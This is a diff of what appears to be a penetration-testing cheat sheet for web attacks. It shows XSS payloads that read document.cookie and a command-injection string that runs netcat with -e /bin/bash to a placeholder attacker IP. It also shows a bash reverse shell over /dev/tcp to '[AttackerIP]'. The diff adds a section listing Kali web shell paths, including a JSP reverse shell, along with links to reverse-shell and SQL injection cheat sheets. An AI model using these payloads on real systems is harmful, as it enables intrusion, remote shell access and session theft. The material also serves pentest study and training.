@@ -48,7 +48,9 @@ POST:
 
 {% highlight html %}
 '';!--"<XSS>=&{()}
+{% endhighlight %}
 
+{% highlight html %}
 <script>alert(document.cookie);</script>
 
 <script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
@@ -109,9 +111,24 @@ test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
 /bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
 {% endhighlight %}
 
+> **Web Shells**
+
+Kali:
+PHP | /usr/share/webshells/php/
+PERL | /usr/share/webshells/perl/
+Cold Fusion | /usr/share/webshells/cfm/
+ASP | /usr/share/webshells/asp/
+ASPX | /usr/share/webshells/aspx/
+JSP | /usr/share/webshells/jsp/jsp-reverse.jsp
+
+* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
+* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+
 > **Useful Resources**
 
 * [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 * [XSS Examples](http://www.xssed.com/)
+* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+* [SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
 * [SQLMap](http://http/sqlmap.org)
-https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+
